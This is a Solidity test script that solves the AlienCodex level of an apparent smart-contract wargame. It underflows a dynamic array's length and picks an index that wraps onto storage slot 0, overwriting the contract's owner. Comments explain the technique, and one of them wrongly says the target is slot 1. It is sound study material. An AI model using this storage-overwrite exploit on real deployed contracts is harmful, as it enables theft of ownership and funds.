// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

import {AlienCodex} from "../../src/19/AlienCodex.sol";
import {AlienCodexFactory} from "src/19/AlienCodexFactory.sol";

// @note To execute the following test locally you can execute the following commands :
// anvil
// forge script test/19/AlienCodex.t.sol:AlienCodexTest --fork-url http://localhost:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
// You can modify the private with any other private key from anvil

contract AlienCodexTest {
    AlienCodex public instanceContract;

    address public player = address(1);
    address public levelFactory;

    function run() external {
        levelFactory = address(new AlienCodexFactory());
        instanceContract = AlienCodex(AlienCodexFactory(levelFactory).createInstance(player));

        instanceContract.makeContact();
        instanceContract.retract(); // This will underflow and make length of codex be type(uint256).max
        // Meaning every storage slot of the contract will point to a value of the array
        // We can just rewrite the array slot that point to the storage of the owner variable.
        // We know that to access the storage slot of the first value of a dynamic array is to use uint256(keccak256(abi.encode(slot))) with slot being the storage slot of the array.
        // In this case it will be 1. Because 0 is the slot of both the owner and contact variable. 
        // Owner has a length of 20 bytes and contact has a length of 8 bytes. https://docs.soliditylang.org/en/v0.4.21/abi-spec.html
        // Slots always contain 32 bytes values. When variables have a cumulative length less or equal than 32 bytes they are packed together. Example: Owner = 0x0000000000000000000000000000000000000005 and contact = true. Storage slot 0 will contain the value : 0x0000000000000000000000010000000000000000000000000000000000000005
        // Need to typecast player to a bytes32 before storing so that it rewrites the owner variable. When typecasting we need to pad the address to the left, this can be achieved by converting to uint256 (direct conversion to bytes32 will pad with zeros to the right).
        // To access the location of a value in a dynamic array directly : location = keccak256(abi.encode(slot)) + index
        // The evm will then perform an sstore(location, value)
        // we can choose index so that location = 1 using overflow
        // The value that allows to do this is type(uint256).max - keccak256(abi.encode(slot)) + 1
        instanceContract.revise(2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1, bytes32(uint256(uint160(player))));

        assert(instanceContract.owner() == player);
    }
}
